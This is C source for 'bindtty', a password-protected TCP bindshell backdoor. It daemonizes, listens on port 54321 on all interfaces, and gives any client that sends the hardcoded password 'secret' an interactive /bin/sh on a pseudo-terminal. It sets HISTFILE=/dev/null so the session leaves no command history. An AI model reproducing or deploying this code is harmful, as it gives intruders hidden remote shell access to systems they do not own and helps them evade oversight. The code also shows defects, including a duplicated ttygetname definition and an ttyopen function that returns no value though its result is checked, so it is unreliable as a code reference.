/*
 * bindtty.c - a TCP/IP bindshell with TTY support
 */


#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>

#ifndef BSDPTY
#include <pty.h>
#endif

#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>      

#define VERSION		"v1.0"
#define PROG		"bindtty"

#define TRUE		1
#define FALSE		0
#define BUFSIZE		2048
#define PORT		54321

#define SHELL		"/bin/sh"
#define PROMPT		"PS1=(bindshell) \\u@\\h:\\w\\$ "
#define TERM		"TERM=xterm"
#define PASSWORD	"secret"

/*
 * fatal - outputs a line to stderr and terminates with status EXIT_FAILURE
 */
void fatal(char *format, ...) {

    char buffer[1024];
    va_list args;
		        
    memset(&buffer, 0, sizeof(buffer));
			        
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer) - 1, format, args);
    va_end(args);
						
    fprintf(stderr, "[%d !!!]: %s\n", getpid(), buffer);
    fflush(stderr);

    if(errno == EINTR)
	return;
    else	
	exit(EXIT_FAILURE);
}

/*
 * msg - outputs a line to stdout
 */
void msg(char *format, ...) {
#ifdef DEBUG
    char buffer[1024];
    va_list args;
		        
    memset(&buffer, 0, sizeof(buffer));
			        
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer) - 1, format, args);
    va_end(args);

    printf("[%d]: %s\n", getpid(), buffer);
    fflush(stdout);
#endif
    return;
}				

/*
 * tcpbind - binds a TCP/IP listener on port and returns the opened socket
 */
int tcpbind(int port) {

    int listener;
    int yes = TRUE;
    struct sockaddr_in addr;
	
    if((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
	fatal("socket() failed -- %s", strerror(errno));

    if(setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
	fatal("setsockopt() failed -- %s", strerror(errno));
	
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
	
    if(bind(listener, (struct sockaddr *) &addr, sizeof(struct sockaddr)) != 0)
	fatal("bind() failed -- %s", strerror(errno));

    if(listen(listener, 1) != 0)
	fatal("listen() failed -- %s", strerror(errno));

    msg("listening on port %d", port);

    return listener;
}

/*
 * tcpaccept - waits for a new connection and returns the opened socket
 */
int tcpaccept(int listener) {

    int clientsock;
    unsigned int size;
    struct sockaddr_in addr;

    memset(&addr, 0, sizeof(addr));
    size = sizeof(struct sockaddr);
    
    msg("waiting for connection");
    
    if((clientsock = accept(listener, (struct sockaddr *) &addr, &size)) == -1) {
	fatal("accept() failed -- %s", strerror(errno));
	return FALSE;
    }

    msg("%s connected", inet_ntoa(addr.sin_addr));

    return clientsock;
}

/*
 * check_password - authenticates clientsock against PASSWORD
 */
int bcheck_password(int clientsock) {

    char buffer[BUFSIZE + 1];
    
    memset(&buffer, 0, sizeof(buffer));
    strncpy(buffer, "Password: ", sizeof(buffer));
    
    if(write(clientsock, buffer, strlen(buffer)) == -1)
	fatal("write() failed -- %s", strerror(errno));
    
    memset(&buffer, 0, sizeof(buffer));

    if(read(clientsock, buffer, BUFSIZE) == -1)
	fatal("read() failed -- %s", strerror(errno));
	
    return strncmp(buffer, PASSWORD, strlen(PASSWORD)) == 0 ? TRUE : FALSE;
}

/*
 * send_banner - sends a small banner to clientsock
 */
void send_banner(int clientsock) {

    char buffer[BUFSIZE + 1];
    
    memset(&buffer, 0, sizeof(buffer));

    snprintf(buffer, sizeof(buffer),
	    
	    "\n"									\
	    "***\n"									\
	    "*** Welcome to this fresh shell!\n"					\
	    "***\n"									\
	    "*** %s %s on %d/tcp, spawning %s\n"					\
	    "***\n"									\
	    "\n",

	    PROG, VERSION, PORT, SHELL);
    
    if(write(clientsock, buffer, strlen(buffer)) == -1)
	fatal("write() failed -- %s", strerror(errno));
}

/*
 * sig_child - signal handler for child processes
 */
void sig_child(int sig) {
    msg("received SIGCHLD");

    while(waitpid(-1, NULL, WNOHANG) > 0)
	;
}

#ifdef BSDPTY
/*
 * ttygetname - writes a tty name in buffer, according to number
 */
void ttygetname(int number, char *base, char *buffer) {

    char series[] = "pqrstuvwxyzabcde";
    char subs[]   = "0123456789abcdef";
    int pos       = strlen(base);
		    
    strcpy(buffer, base);
    buffer[pos]     = series[(number >> 4) & 0xF];
    buffer[pos + 1] = subs[number & 0xF];
    buffer[pos + 2] = 0;
}
#endif

/*
 * ttyopen - opens a new pty/tty pair
 */


void ttygetname(int number, char *base, char *buffer) {

    char series[] = "pqrstuvwxyzabcde";
    char subs[]   = "0123456789abcdef";
    int pos       = strlen(base);
		    
    strcpy(buffer, base);
    buffer[pos]     = series[(number >> 4) & 0xF];
    buffer[pos + 1] = subs[number & 0xF];
    buffer[pos + 2] = 0;
}

int ttyopen(int *pty, int *tty) {

    char buffer[128];
    int i;

    for(i = 0; i < 256; i++) {
	ttygetname(i, "/dev/pty", buffer);
	
	if((*pty = open(buffer, O_RDWR)) == -1) {
	    close(*pty);
	    continue;
	}

	ttygetname(i, "/dev/tty", buffer);
	if((*tty = open(buffer, O_RDWR)) == -1) {
	    close(*pty);
	    close(*tty);
	    continue;
	} else
	    return;
    }
}

/*
 * loopshell - select() on I/O from clientsock, and write to pty
 */
void loopshell(int clientsock, int pty, pid_t shellpid) {

    fd_set r;
    char buffer[BUFSIZE + 1];
    int result;
    
    msg("looping shell");

    while(TRUE) {
    
        FD_ZERO(&r);
	FD_SET(clientsock, &r);
	FD_SET(pty, &r);

	msg("select()");

	/* wait until new data coming from clientsock or pty */
	if((result = select((pty > clientsock) ? (pty + 1) : (clientsock + 1), &r, NULL, NULL, NULL)) == -1)
	    fatal("select() failed -- %s", strerror(errno));
	else
	    msg("select() returned %d", result);

	/* new data from client? */
	if(FD_ISSET(clientsock, &r)) {
	    memset(&buffer, 0, sizeof(buffer));
	    
	    if((result = read(clientsock, buffer, BUFSIZE)) == -1) {
		fatal("read() from clientsock failed -- %s", strerror(errno));
		
	    } else if(result == 0) {
		msg("client has disconnected");
		exit(EXIT_SUCCESS);

	    } else {
		msg("received %d bytes from client", result);

		if((write(pty, buffer, result) == -1))
		    fatal("write() to PTY failed -- %s", strerror(errno));
	    }
	}
	
	/* new data from the shell? */
	if(FD_ISSET(pty, &r)) {
	    memset(&buffer, 0, sizeof(buffer));
	    
	    if((result = read(pty, buffer, BUFSIZE)) == -1) {
		fatal("read() from PTY failed -- %s", strerror(errno));
	    
	    } else if(result == 0) {
		msg("PTY disconnected");
		exit(EXIT_SUCCESS);

	    } else {
		msg("received %d bytes from PTY", result);
		
		if((write(clientsock, buffer, result)) == -1)
		    fatal("write() to clientsock failed -- %s", strerror(errno));
	    }
	}	
    }

}

/*
 * forkshell - spawns a new shell using clientsock as input/output
 */
void forkshell(int clientsock) {

    char * args[2];
    char * env[4];
    int pty, tty;
    pid_t shellpid;
    pid_t controlpid;

    if(!bcheck_password(clientsock)) {
	shutdown(clientsock, SHUT_RDWR);
	close(clientsock);
	return;
    }
    
    msg("forking shell");
    send_banner(clientsock);

    /* open a new tty/pty pair */
    if(!ttyopen(&pty, &tty)) {
	msg("failed to open pty/tty pair");
	return;
    }

    /* fork first child to launch the actual shell connected to the /dev/pty */
    shellpid = fork();
    
    switch(shellpid) {
	case -1:
	    fatal("fork() failed -- %s", strerror(errno));
	    break;
	
	case 0:
	    msg("childed forked for %s", SHELL);

	    /* close all standard file descriptors */
	    close(0);
	    close(1);
	    close(2);

	    /* close master pty and tcp sockets */
	    close(pty);
	    close(clientsock);

	    /* open a new session, and attach tty to this process */
	    setsid();
	    ioctl(tty, TIOCSCTTY);

	    /* setup default signal handlers */
	    signal(SIGHUP, SIG_DFL);
	    signal(SIGCHLD, SIG_DFL);

	    /* duplicate slave tty as standard input output descriptors */
	    dup2(tty, 0);
	    dup2(tty, 1);
	    dup2(tty, 2);
	    close(tty);

	    /* fill in arguments array */			
    	    args[0] = SHELL;
    	    args[1] = 0;
	    env[0]  = PROMPT;
	    env[1]  = TERM;
	    env[2]  = "HISTFILE=/dev/null";
	    env[3]  = 0;
	
	    /* attempt to execute the shell */
    	    execve(SHELL, args, env);
	    
	    /* not reached */
	    fatal("execve() failed -- %s", strerror(errno));
	    break;
	
	default:
	    close(tty);
	    break;
    }
    
    controlpid = fork();
    
    switch(controlpid) {
	case -1:
	    fatal("fork() failed -- %s", strerror(errno));
	    break;

	case 0:
	    msg("child forked for select()");
	    loopshell(clientsock, pty, shellpid);
	    break;
	
	default:
	    close(clientsock);
	    close(pty);
	    break;
    }
}

/*
 * daemonize - become a daemon
 */
int daemonize() {

#ifndef DEBUG
    switch(fork()) {
	case -1:
	    fatal("fork() failed -- %s", strerror(errno));
	    break;
	
	case 0:
	    close(0);
	    close(1);
	    close(2);
	    
	    open("/dev/null", O_RDWR);
	    open("/dev/null", O_RDWR);
	    open("/dev/null", O_RDWR);
#endif	    
	    signal(SIGCHLD, sig_child);
	    
	    return TRUE;
#ifndef DEBUG	
	default:
	    break;
    }
    return FALSE;
#endif
}

/*
 * main - program entrance
 */
int bindtty_main(void) {

    int listener;
    int clientsock;

    if(!daemonize())
	exit(EXIT_SUCCESS);
    
    if(!(listener = tcpbind(PORT)))
	exit(EXIT_SUCCESS);

    for(;;) {
	if((clientsock = tcpaccept(listener))) {
	    forkshell(clientsock);
	}
    }
}
